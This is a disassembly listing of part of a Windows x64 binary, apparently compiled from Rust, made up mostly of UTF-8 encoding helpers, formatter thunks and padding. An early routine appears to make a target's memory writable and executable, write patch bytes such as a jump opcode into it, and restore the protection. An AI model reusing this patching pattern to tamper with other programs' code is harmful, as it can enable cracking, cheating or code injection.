   140004ce9:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004cf0:	00 00 
   140004cf2:	4c 8d 44 24 2e       	lea    0x2e(%rsp),%r8
   140004cf7:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140004cfd:	48 89 f9             	mov    %rdi,%rcx
   140004d00:	48 89 da             	mov    %rbx,%rdx
   140004d03:	e8 64 9a 01 00       	call   0x14001e76c
   140004d08:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   140004d0d:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004d12:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004d18:	48 89 f9             	mov    %rdi,%rcx
   140004d1b:	48 89 da             	mov    %rbx,%rdx
   140004d1e:	e8 43 9a 01 00       	call   0x14001e766
   140004d23:	49 83 fe 01          	cmp    $0x1,%r14
   140004d27:	0f 84 8d 00 00 00    	je     0x140004dba
   140004d2d:	49 03 77 08          	add    0x8(%r15),%rsi
   140004d31:	c6 44 24 2d 75       	movb   $0x75,0x2d(%rsp)
   140004d36:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140004d3d:	00 
   140004d3e:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140004d43:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004d48:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004d4e:	48 89 f9             	mov    %rdi,%rcx
   140004d51:	48 89 f2             	mov    %rsi,%rdx
   140004d54:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004d5a:	e8 07 9a 01 00       	call   0x14001e766
   140004d5f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004d66:	00 00 
   140004d68:	4c 8d 44 24 2d       	lea    0x2d(%rsp),%r8
   140004d6d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004d73:	48 89 f9             	mov    %rdi,%rcx
   140004d76:	48 89 f2             	mov    %rsi,%rdx
   140004d79:	e8 ee 99 01 00       	call   0x14001e76c
   140004d7e:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   140004d83:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004d88:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004d8e:	48 89 f9             	mov    %rdi,%rcx
   140004d91:	48 89 f2             	mov    %rsi,%rdx
   140004d94:	e8 cd 99 01 00       	call   0x14001e766
   140004d99:	90                   	nop
   140004d9a:	48 83 c4 38          	add    $0x38,%rsp
   140004d9e:	5b                   	pop    %rbx
   140004d9f:	5f                   	pop    %rdi
   140004da0:	5e                   	pop    %rsi
   140004da1:	41 5c                	pop    %r12
   140004da3:	41 5e                	pop    %r14
   140004da5:	41 5f                	pop    %r15
   140004da7:	c3                   	ret
   140004da8:	4c 8d 05 31 ce 01 00 	lea    0x1ce31(%rip),%r8        # 0x140021be0
   140004daf:	31 c9                	xor    %ecx,%ecx
   140004db1:	31 d2                	xor    %edx,%edx
   140004db3:	e8 c8 ac 01 00       	call   0x14001fa80
   140004db8:	0f 0b                	ud2
   140004dba:	4c 8d 05 37 ce 01 00 	lea    0x1ce37(%rip),%r8        # 0x140021bf8
   140004dc1:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004dc6:	ba 01 00 00 00       	mov    $0x1,%edx
   140004dcb:	e8 b0 ac 01 00       	call   0x14001fa80
   140004dd0:	0f 0b                	ud2
   140004dd2:	cc                   	int3
   140004dd3:	cc                   	int3
   140004dd4:	cc                   	int3
   140004dd5:	cc                   	int3
   140004dd6:	cc                   	int3
   140004dd7:	cc                   	int3
   140004dd8:	cc                   	int3
   140004dd9:	cc                   	int3
   140004dda:	cc                   	int3
   140004ddb:	cc                   	int3
   140004ddc:	cc                   	int3
   140004ddd:	cc                   	int3
   140004dde:	cc                   	int3
   140004ddf:	cc                   	int3
   140004de0:	48 83 ec 28          	sub    $0x28,%rsp
   140004de4:	ff d1                	call   *%rcx
   140004de6:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140004deb:	48 83 c4 28          	add    $0x28,%rsp
   140004def:	c3                   	ret
   140004df0:	48 83 ec 28          	sub    $0x28,%rsp
   140004df4:	48 8b 09             	mov    (%rcx),%rcx
   140004df7:	e8 e4 ff ff ff       	call   0x140004de0
   140004dfc:	31 c0                	xor    %eax,%eax
   140004dfe:	48 83 c4 28          	add    $0x28,%rsp
   140004e02:	c3                   	ret
   140004e03:	cc                   	int3
   140004e04:	cc                   	int3
   140004e05:	cc                   	int3
   140004e06:	cc                   	int3
   140004e07:	cc                   	int3
   140004e08:	cc                   	int3
   140004e09:	cc                   	int3
   140004e0a:	cc                   	int3
   140004e0b:	cc                   	int3
   140004e0c:	cc                   	int3
   140004e0d:	cc                   	int3
   140004e0e:	cc                   	int3
   140004e0f:	cc                   	int3
   140004e10:	e9 9b a2 00 00       	jmp    0x14000f0b0
   140004e15:	cc                   	int3
   140004e16:	cc                   	int3
   140004e17:	cc                   	int3
   140004e18:	cc                   	int3
   140004e19:	cc                   	int3
   140004e1a:	cc                   	int3
   140004e1b:	cc                   	int3
   140004e1c:	cc                   	int3
   140004e1d:	cc                   	int3
   140004e1e:	cc                   	int3
   140004e1f:	cc                   	int3
   140004e20:	e9 fb a2 00 00       	jmp    0x14000f120
   140004e25:	cc                   	int3
   140004e26:	cc                   	int3
   140004e27:	cc                   	int3
   140004e28:	cc                   	int3
   140004e29:	cc                   	int3
   140004e2a:	cc                   	int3
   140004e2b:	cc                   	int3
   140004e2c:	cc                   	int3
   140004e2d:	cc                   	int3
   140004e2e:	cc                   	int3
   140004e2f:	cc                   	int3
   140004e30:	e9 2b a3 00 00       	jmp    0x14000f160
   140004e35:	cc                   	int3
   140004e36:	cc                   	int3
   140004e37:	cc                   	int3
   140004e38:	cc                   	int3
   140004e39:	cc                   	int3
   140004e3a:	cc                   	int3
   140004e3b:	cc                   	int3
   140004e3c:	cc                   	int3
   140004e3d:	cc                   	int3
   140004e3e:	cc                   	int3
   140004e3f:	cc                   	int3
   140004e40:	e9 6b a3 00 00       	jmp    0x14000f1b0
   140004e45:	cc                   	int3
   140004e46:	cc                   	int3
   140004e47:	cc                   	int3
   140004e48:	cc                   	int3
   140004e49:	cc                   	int3
   140004e4a:	cc                   	int3
   140004e4b:	cc                   	int3
   140004e4c:	cc                   	int3
   140004e4d:	cc                   	int3
   140004e4e:	cc                   	int3
   140004e4f:	cc                   	int3
   140004e50:	e9 eb 45 01 00       	jmp    0x140019440
   140004e55:	cc                   	int3
   140004e56:	cc                   	int3
   140004e57:	cc                   	int3
   140004e58:	cc                   	int3
   140004e59:	cc                   	int3
   140004e5a:	cc                   	int3
   140004e5b:	cc                   	int3
   140004e5c:	cc                   	int3
   140004e5d:	cc                   	int3
   140004e5e:	cc                   	int3
   140004e5f:	cc                   	int3
   140004e60:	48 b8 25 21 ed 30 44 	movabs $0x30abf54430ed2125,%rax
   140004e67:	f5 ab 30 
   140004e6a:	c3                   	ret
   140004e6b:	cc                   	int3
   140004e6c:	cc                   	int3
   140004e6d:	cc                   	int3
   140004e6e:	cc                   	int3
   140004e6f:	cc                   	int3
   140004e70:	48 b8 79 48 fd 32 7f 	movabs $0x6000737f32fd4879,%rax
   140004e77:	73 00 60 
   140004e7a:	c3                   	ret
   140004e7b:	cc                   	int3
   140004e7c:	cc                   	int3
   140004e7d:	cc                   	int3
   140004e7e:	cc                   	int3
   140004e7f:	cc                   	int3
   140004e80:	48 b8 f4 bc c7 ec 1e 	movabs $0x7ef2a91eecc7bcf4,%rax
   140004e87:	a9 f2 7e 
   140004e8a:	c3                   	ret
   140004e8b:	cc                   	int3
   140004e8c:	cc                   	int3
   140004e8d:	cc                   	int3
   140004e8e:	cc                   	int3
   140004e8f:	cc                   	int3
   140004e90:	48 8b 01             	mov    (%rcx),%rax
   140004e93:	48 8b 08             	mov    (%rax),%rcx
   140004e96:	48 8b 40 08          	mov    0x8(%rax),%rax
   140004e9a:	48 8b 40 48          	mov    0x48(%rax),%rax
   140004e9e:	48 ff e0             	rex.W jmp *%rax
   140004ea1:	cc                   	int3
   140004ea2:	cc                   	int3
   140004ea3:	cc                   	int3
   140004ea4:	cc                   	int3
   140004ea5:	cc                   	int3
   140004ea6:	cc                   	int3
   140004ea7:	cc                   	int3
   140004ea8:	cc                   	int3
   140004ea9:	cc                   	int3
   140004eaa:	cc                   	int3
   140004eab:	cc                   	int3
   140004eac:	cc                   	int3
   140004ead:	cc                   	int3
   140004eae:	cc                   	int3
   140004eaf:	cc                   	int3
   140004eb0:	56                   	push   %rsi
   140004eb1:	57                   	push   %rdi
   140004eb2:	48 83 ec 28          	sub    $0x28,%rsp
   140004eb6:	48 89 d6             	mov    %rdx,%rsi
   140004eb9:	48 8b 39             	mov    (%rcx),%rdi
   140004ebc:	48 89 d1             	mov    %rdx,%rcx
   140004ebf:	e8 2c 6a 01 00       	call   0x14001b8f0
   140004ec4:	84 c0                	test   %al,%al
   140004ec6:	74 11                	je     0x140004ed9
   140004ec8:	48 89 f9             	mov    %rdi,%rcx
   140004ecb:	48 89 f2             	mov    %rsi,%rdx
   140004ece:	48 83 c4 28          	add    $0x28,%rsp
   140004ed2:	5f                   	pop    %rdi
   140004ed3:	5e                   	pop    %rsi
   140004ed4:	e9 47 86 01 00       	jmp    0x14001d520
   140004ed9:	48 89 f1             	mov    %rsi,%rcx
   140004edc:	e8 1f 6a 01 00       	call   0x14001b900
   140004ee1:	48 89 f9             	mov    %rdi,%rcx
   140004ee4:	48 89 f2             	mov    %rsi,%rdx
   140004ee7:	84 c0                	test   %al,%al
   140004ee9:	74 0b                	je     0x140004ef6
   140004eeb:	48 83 c4 28          	add    $0x28,%rsp
   140004eef:	5f                   	pop    %rdi
   140004ef0:	5e                   	pop    %rsi
   140004ef1:	e9 ca 86 01 00       	jmp    0x14001d5c0
   140004ef6:	90                   	nop
   140004ef7:	48 83 c4 28          	add    $0x28,%rsp
   140004efb:	5f                   	pop    %rdi
   140004efc:	5e                   	pop    %rsi
   140004efd:	e9 be 8c 01 00       	jmp    0x14001dbc0
   140004f02:	cc                   	int3
   140004f03:	cc                   	int3
   140004f04:	cc                   	int3
   140004f05:	cc                   	int3
   140004f06:	cc                   	int3
   140004f07:	cc                   	int3
   140004f08:	cc                   	int3
   140004f09:	cc                   	int3
   140004f0a:	cc                   	int3
   140004f0b:	cc                   	int3
   140004f0c:	cc                   	int3
   140004f0d:	cc                   	int3
   140004f0e:	cc                   	int3
   140004f0f:	cc                   	int3
   140004f10:	56                   	push   %rsi
   140004f11:	57                   	push   %rdi
   140004f12:	48 83 ec 28          	sub    $0x28,%rsp
   140004f16:	48 89 d6             	mov    %rdx,%rsi
   140004f19:	48 8b 39             	mov    (%rcx),%rdi
   140004f1c:	48 89 d1             	mov    %rdx,%rcx
   140004f1f:	e8 cc 69 01 00       	call   0x14001b8f0
   140004f24:	84 c0                	test   %al,%al
   140004f26:	74 11                	je     0x140004f39
   140004f28:	48 89 f9             	mov    %rdi,%rcx
   140004f2b:	48 89 f2             	mov    %rsi,%rdx
   140004f2e:	48 83 c4 28          	add    $0x28,%rsp
   140004f32:	5f                   	pop    %rdi
   140004f33:	5e                   	pop    %rsi
   140004f34:	e9 07 89 01 00       	jmp    0x14001d840
   140004f39:	48 89 f1             	mov    %rsi,%rcx
   140004f3c:	e8 bf 69 01 00       	call   0x14001b900
   140004f41:	48 89 f9             	mov    %rdi,%rcx
   140004f44:	48 89 f2             	mov    %rsi,%rdx
   140004f47:	84 c0                	test   %al,%al
   140004f49:	74 0b                	je     0x140004f56
   140004f4b:	48 83 c4 28          	add    $0x28,%rsp
   140004f4f:	5f                   	pop    %rdi
   140004f50:	5e                   	pop    %rsi
   140004f51:	e9 8a 89 01 00       	jmp    0x14001d8e0
   140004f56:	90                   	nop
   140004f57:	48 83 c4 28          	add    $0x28,%rsp
   140004f5b:	5f                   	pop    %rdi
   140004f5c:	5e                   	pop    %rsi
   140004f5d:	e9 7e 8f 01 00       	jmp    0x14001dee0
   140004f62:	cc                   	int3
   140004f63:	cc                   	int3
   140004f64:	cc                   	int3
   140004f65:	cc                   	int3
   140004f66:	cc                   	int3
   140004f67:	cc                   	int3
   140004f68:	cc                   	int3
   140004f69:	cc                   	int3
   140004f6a:	cc                   	int3
   140004f6b:	cc                   	int3
   140004f6c:	cc                   	int3
   140004f6d:	cc                   	int3
   140004f6e:	cc                   	int3
   140004f6f:	cc                   	int3
   140004f70:	48 8b 09             	mov    (%rcx),%rcx
   140004f73:	e9 48 be 00 00       	jmp    0x140010dc0
   140004f78:	cc                   	int3
   140004f79:	cc                   	int3
   140004f7a:	cc                   	int3
   140004f7b:	cc                   	int3
   140004f7c:	cc                   	int3
   140004f7d:	cc                   	int3
   140004f7e:	cc                   	int3
   140004f7f:	cc                   	int3
   140004f80:	41 57                	push   %r15
   140004f82:	41 56                	push   %r14
   140004f84:	56                   	push   %rsi
   140004f85:	57                   	push   %rdi
   140004f86:	53                   	push   %rbx
   140004f87:	48 83 ec 40          	sub    $0x40,%rsp
   140004f8b:	48 8b 01             	mov    (%rcx),%rax
   140004f8e:	48 8b 30             	mov    (%rax),%rsi
   140004f91:	48 8b 78 10          	mov    0x10(%rax),%rdi
   140004f95:	48 89 d1             	mov    %rdx,%rcx
   140004f98:	e8 e3 69 01 00       	call   0x14001b980
   140004f9d:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140004fa2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004fa7:	48 85 ff             	test   %rdi,%rdi
   140004faa:	74 31                	je     0x140004fdd
   140004fac:	4c 8d 35 1d ce 01 00 	lea    0x1ce1d(%rip),%r14        # 0x140021dd0
   140004fb3:	4c 8d 7c 24 28       	lea    0x28(%rsp),%r15
   140004fb8:	48 8d 5c 24 38       	lea    0x38(%rsp),%rbx
   140004fbd:	0f 1f 00             	nopl   (%rax)
   140004fc0:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140004fc5:	48 83 c6 01          	add    $0x1,%rsi
   140004fc9:	4c 89 f9             	mov    %r15,%rcx
   140004fcc:	48 89 da             	mov    %rbx,%rdx
   140004fcf:	4d 89 f0             	mov    %r14,%r8
   140004fd2:	e8 a9 57 01 00       	call   0x14001a780
   140004fd7:	48 83 c7 ff          	add    $0xffffffffffffffff,%rdi
   140004fdb:	75 e3                	jne    0x140004fc0
   140004fdd:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140004fe2:	e8 b9 57 01 00       	call   0x14001a7a0
   140004fe7:	90                   	nop
   140004fe8:	48 83 c4 40          	add    $0x40,%rsp
   140004fec:	5b                   	pop    %rbx
   140004fed:	5f                   	pop    %rdi
   140004fee:	5e                   	pop    %rsi
   140004fef:	41 5e                	pop    %r14
   140004ff1:	41 5f                	pop    %r15
   140004ff3:	c3                   	ret
   140004ff4:	cc                   	int3
   140004ff5:	cc                   	int3
   140004ff6:	cc                   	int3
   140004ff7:	cc                   	int3
   140004ff8:	cc                   	int3
   140004ff9:	cc                   	int3
   140004ffa:	cc                   	int3
   140004ffb:	cc                   	int3
   140004ffc:	cc                   	int3
   140004ffd:	cc                   	int3
   140004ffe:	cc                   	int3
   140004fff:	cc                   	int3
   140005000:	49 89 d0             	mov    %rdx,%r8
   140005003:	48 8b 01             	mov    (%rcx),%rax
   140005006:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   14000500a:	48 89 c1             	mov    %rax,%rcx
   14000500d:	e9 fe 6e 01 00       	jmp    0x14001bf10
   140005012:	cc                   	int3
   140005013:	cc                   	int3
   140005014:	cc                   	int3
   140005015:	cc                   	int3
   140005016:	cc                   	int3
   140005017:	cc                   	int3
   140005018:	cc                   	int3
   140005019:	cc                   	int3
   14000501a:	cc                   	int3
   14000501b:	cc                   	int3
   14000501c:	cc                   	int3
   14000501d:	cc                   	int3
   14000501e:	cc                   	int3
   14000501f:	cc                   	int3
   140005020:	48 8b 09             	mov    (%rcx),%rcx
   140005023:	e9 48 4d 01 00       	jmp    0x140019d70
   140005028:	cc                   	int3
   140005029:	cc                   	int3
   14000502a:	cc                   	int3
   14000502b:	cc                   	int3
   14000502c:	cc                   	int3
   14000502d:	cc                   	int3
   14000502e:	cc                   	int3
   14000502f:	cc                   	int3
   140005030:	56                   	push   %rsi
   140005031:	57                   	push   %rdi
   140005032:	48 83 ec 28          	sub    $0x28,%rsp
   140005036:	48 89 d6             	mov    %rdx,%rsi
   140005039:	48 89 cf             	mov    %rcx,%rdi
   14000503c:	48 89 d1             	mov    %rdx,%rcx
   14000503f:	e8 ac 68 01 00       	call   0x14001b8f0
   140005044:	84 c0                	test   %al,%al
   140005046:	74 11                	je     0x140005059
   140005048:	48 89 f9             	mov    %rdi,%rcx
   14000504b:	48 89 f2             	mov    %rsi,%rdx
   14000504e:	48 83 c4 28          	add    $0x28,%rsp
   140005052:	5f                   	pop    %rdi
   140005053:	5e                   	pop    %rsi
   140005054:	e9 a7 86 01 00       	jmp    0x14001d700
   140005059:	48 89 f1             	mov    %rsi,%rcx
   14000505c:	e8 9f 68 01 00       	call   0x14001b900
   140005061:	48 89 f9             	mov    %rdi,%rcx
   140005064:	48 89 f2             	mov    %rsi,%rdx
   140005067:	84 c0                	test   %al,%al
   140005069:	74 0b                	je     0x140005076
   14000506b:	48 83 c4 28          	add    $0x28,%rsp
   14000506f:	5f                   	pop    %rdi
   140005070:	5e                   	pop    %rsi
   140005071:	e9 2a 87 01 00       	jmp    0x14001d7a0
   140005076:	90                   	nop
   140005077:	48 83 c4 28          	add    $0x28,%rsp
   14000507b:	5f                   	pop    %rdi
   14000507c:	5e                   	pop    %rsi
   14000507d:	e9 de 8b 01 00       	jmp    0x14001dc60
   140005082:	cc                   	int3
   140005083:	cc                   	int3
   140005084:	cc                   	int3
   140005085:	cc                   	int3
   140005086:	cc                   	int3
   140005087:	cc                   	int3
   140005088:	cc                   	int3
   140005089:	cc                   	int3
   14000508a:	cc                   	int3
   14000508b:	cc                   	int3
   14000508c:	cc                   	int3
   14000508d:	cc                   	int3
   14000508e:	cc                   	int3
   14000508f:	cc                   	int3
   140005090:	48 83 ec 28          	sub    $0x28,%rsp
   140005094:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
   14000509b:	00 
   14000509c:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   1400050a2:	73 0f                	jae    0x1400050b3
   1400050a4:	88 54 24 24          	mov    %dl,0x24(%rsp)
   1400050a8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400050ae:	e9 88 00 00 00       	jmp    0x14000513b
   1400050b3:	89 d0                	mov    %edx,%eax
   1400050b5:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   1400050bb:	73 1b                	jae    0x1400050d8
   1400050bd:	c1 e8 06             	shr    $0x6,%eax
   1400050c0:	0c c0                	or     $0xc0,%al
   1400050c2:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400050c6:	80 e2 3f             	and    $0x3f,%dl
   1400050c9:	80 ca 80             	or     $0x80,%dl
   1400050cc:	88 54 24 25          	mov    %dl,0x25(%rsp)
   1400050d0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400050d6:	eb 63                	jmp    0x14000513b
   1400050d8:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   1400050de:	73 28                	jae    0x140005108
   1400050e0:	c1 e8 0c             	shr    $0xc,%eax
   1400050e3:	0c e0                	or     $0xe0,%al
   1400050e5:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400050e9:	89 d0                	mov    %edx,%eax
   1400050eb:	c1 e8 06             	shr    $0x6,%eax
   1400050ee:	24 3f                	and    $0x3f,%al
   1400050f0:	0c 80                	or     $0x80,%al
   1400050f2:	88 44 24 25          	mov    %al,0x25(%rsp)
   1400050f6:	80 e2 3f             	and    $0x3f,%dl
   1400050f9:	80 ca 80             	or     $0x80,%dl
   1400050fc:	88 54 24 26          	mov    %dl,0x26(%rsp)
   140005100:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140005106:	eb 33                	jmp    0x14000513b
   140005108:	c1 e8 12             	shr    $0x12,%eax
   14000510b:	0c f0                	or     $0xf0,%al
   14000510d:	88 44 24 24          	mov    %al,0x24(%rsp)
   140005111:	89 d0                	mov    %edx,%eax
   140005113:	c1 e8 0c             	shr    $0xc,%eax
   140005116:	24 3f                	and    $0x3f,%al
   140005118:	0c 80                	or     $0x80,%al
   14000511a:	88 44 24 25          	mov    %al,0x25(%rsp)
   14000511e:	89 d0                	mov    %edx,%eax
   140005120:	c1 e8 06             	shr    $0x6,%eax
   140005123:	24 3f                	and    $0x3f,%al
   140005125:	0c 80                	or     $0x80,%al
   140005127:	88 44 24 26          	mov    %al,0x26(%rsp)
   14000512b:	80 e2 3f             	and    $0x3f,%dl
   14000512e:	80 ca 80             	or     $0x80,%dl
   140005131:	88 54 24 27          	mov    %dl,0x27(%rsp)
   140005135:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000513b:	48 8d 54 24 24       	lea    0x24(%rsp),%rdx
   140005140:	e8 3b 65 00 00       	call   0x14000b680
   140005145:	90                   	nop
   140005146:	48 83 c4 28          	add    $0x28,%rsp
   14000514a:	c3                   	ret
   14000514b:	cc                   	int3
   14000514c:	cc                   	int3
   14000514d:	cc                   	int3
   14000514e:	cc                   	int3
   14000514f:	cc                   	int3
   140005150:	48 83 ec 28          	sub    $0x28,%rsp
   140005154:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
   14000515b:	00 
   14000515c:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   140005162:	73 0f                	jae    0x140005173
   140005164:	88 54 24 24          	mov    %dl,0x24(%rsp)
   140005168:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000516e:	e9 88 00 00 00       	jmp    0x1400051fb
   140005173:	89 d0                	mov    %edx,%eax
   140005175:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   14000517b:	73 1b                	jae    0x140005198
   14000517d:	c1 e8 06             	shr    $0x6,%eax
   140005180:	0c c0                	or     $0xc0,%al
   140005182:	88 44 24 24          	mov    %al,0x24(%rsp)
   140005186:	80 e2 3f             	and    $0x3f,%dl
   140005189:	80 ca 80             	or     $0x80,%dl
   14000518c:	88 54 24 25          	mov    %dl,0x25(%rsp)
   140005190:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140005196:	eb 63                	jmp    0x1400051fb
   140005198:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   14000519e:	73 28                	jae    0x1400051c8
   1400051a0:	c1 e8 0c             	shr    $0xc,%eax
   1400051a3:	0c e0                	or     $0xe0,%al
   1400051a5:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400051a9:	89 d0                	mov    %edx,%eax
   1400051ab:	c1 e8 06             	shr    $0x6,%eax
   1400051ae:	24 3f                	and    $0x3f,%al
   1400051b0:	0c 80                	or     $0x80,%al
   1400051b2:	88 44 24 25          	mov    %al,0x25(%rsp)
   1400051b6:	80 e2 3f             	and    $0x3f,%dl
   1400051b9:	80 ca 80             	or     $0x80,%dl
   1400051bc:	88 54 24 26          	mov    %dl,0x26(%rsp)
   1400051c0:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400051c6:	eb 33                	jmp    0x1400051fb
   1400051c8:	c1 e8 12             	shr    $0x12,%eax
   1400051cb:	0c f0                	or     $0xf0,%al
   1400051cd:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400051d1:	89 d0                	mov    %edx,%eax
   1400051d3:	c1 e8 0c             	shr    $0xc,%eax
   1400051d6:	24 3f                	and    $0x3f,%al
   1400051d8:	0c 80                	or     $0x80,%al
   1400051da:	88 44 24 25          	mov    %al,0x25(%rsp)
   1400051de:	89 d0                	mov    %edx,%eax
   1400051e0:	c1 e8 06             	shr    $0x6,%eax
   1400051e3:	24 3f                	and    $0x3f,%al
   1400051e5:	0c 80                	or     $0x80,%al
   1400051e7:	88 44 24 26          	mov    %al,0x26(%rsp)
   1400051eb:	80 e2 3f             	and    $0x3f,%dl
   1400051ee:	80 ca 80             	or     $0x80,%dl
   1400051f1:	88 54 24 27          	mov    %dl,0x27(%rsp)
   1400051f5:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400051fb:	48 8d 54 24 24       	lea    0x24(%rsp),%rdx
   140005200:	e8 4b 63 00 00       	call   0x14000b550
   140005205:	90                   	nop
   140005206:	48 83 c4 28          	add    $0x28,%rsp
   14000520a:	c3                   	ret
   14000520b:	cc                   	int3
   14000520c:	cc                   	int3
   14000520d:	cc                   	int3
   14000520e:	cc                   	int3
   14000520f:	cc                   	int3
   140005210:	48 83 ec 28          	sub    $0x28,%rsp
   140005214:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
   14000521b:	00 
   14000521c:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   140005222:	73 0f                	jae    0x140005233
   140005224:	88 54 24 24          	mov    %dl,0x24(%rsp)
   140005228:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000522e:	e9 88 00 00 00       	jmp    0x1400052bb
   140005233:	89 d0                	mov    %edx,%eax
   140005235:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   14000523b:	73 1b                	jae    0x140005258
   14000523d:	c1 e8 06             	shr    $0x6,%eax
   140005240:	0c c0                	or     $0xc0,%al
   140005242:	88 44 24 24          	mov    %al,0x24(%rsp)
   140005246:	80 e2 3f             	and    $0x3f,%dl
   140005249:	80 ca 80             	or     $0x80,%dl
   14000524c:	88 54 24 25          	mov    %dl,0x25(%rsp)
   140005250:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140005256:	eb 63                	jmp    0x1400052bb
   140005258:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   14000525e:	73 28                	jae    0x140005288
   140005260:	c1 e8 0c             	shr    $0xc,%eax
   140005263:	0c e0                	or     $0xe0,%al
   140005265:	88 44 24 24          	mov    %al,0x24(%rsp)
   140005269:	89 d0                	mov    %edx,%eax
   14000526b:	c1 e8 06             	shr    $0x6,%eax
   14000526e:	24 3f                	and    $0x3f,%al
   140005270:	0c 80                	or     $0x80,%al
   140005272:	88 44 24 25          	mov    %al,0x25(%rsp)
   140005276:	80 e2 3f             	and    $0x3f,%dl
   140005279:	80 ca 80             	or     $0x80,%dl
   14000527c:	88 54 24 26          	mov    %dl,0x26(%rsp)
   140005280:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140005286:	eb 33                	jmp    0x1400052bb
   140005288:	c1 e8 12             	shr    $0x12,%eax
   14000528b:	0c f0                	or     $0xf0,%al
   14000528d:	88 44 24 24          	mov    %al,0x24(%rsp)
   140005291:	89 d0                	mov    %edx,%eax
   140005293:	c1 e8 0c             	shr    $0xc,%eax
   140005296:	24 3f                	and    $0x3f,%al
   140005298:	0c 80                	or     $0x80,%al
   14000529a:	88 44 24 25          	mov    %al,0x25(%rsp)
   14000529e:	89 d0                	mov    %edx,%eax
   1400052a0:	c1 e8 06             	shr    $0x6,%eax
   1400052a3:	24 3f                	and    $0x3f,%al
   1400052a5:	0c 80                	or     $0x80,%al
   1400052a7:	88 44 24 26          	mov    %al,0x26(%rsp)
   1400052ab:	80 e2 3f             	and    $0x3f,%dl
   1400052ae:	80 ca 80             	or     $0x80,%dl
   1400052b1:	88 54 24 27          	mov    %dl,0x27(%rsp)
   1400052b5:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400052bb:	48 8d 54 24 24       	lea    0x24(%rsp),%rdx
   1400052c0:	e8 5b 1d 00 00       	call   0x140007020
   1400052c5:	31 c0                	xor    %eax,%eax
   1400052c7:	48 83 c4 28          	add    $0x28,%rsp
   1400052cb:	c3                   	ret
   1400052cc:	cc                   	int3
   1400052cd:	cc                   	int3
   1400052ce:	cc                   	int3
   1400052cf:	cc                   	int3
   1400052d0:	48 83 ec 68          	sub    $0x68,%rsp
   1400052d4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400052d9:	0f 10 02             	movups (%rdx),%xmm0
   1400052dc:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   1400052e0:	0f 10 52 20          	movups 0x20(%rdx),%xmm2
   1400052e4:	0f 29 54 24 50       	movaps %xmm2,0x50(%rsp)
   1400052e9:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   1400052ee:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   1400052f3:	48 8d 15 16 ca 01 00 	lea    0x1ca16(%rip),%rdx        # 0x140021d10
   1400052fa:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400052ff:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005304:	e8 37 57 01 00       	call   0x14001aa40
   140005309:	90                   	nop
   14000530a:	48 83 c4 68          	add    $0x68,%rsp
   14000530e:	c3                   	ret
   14000530f:	cc                   	int3
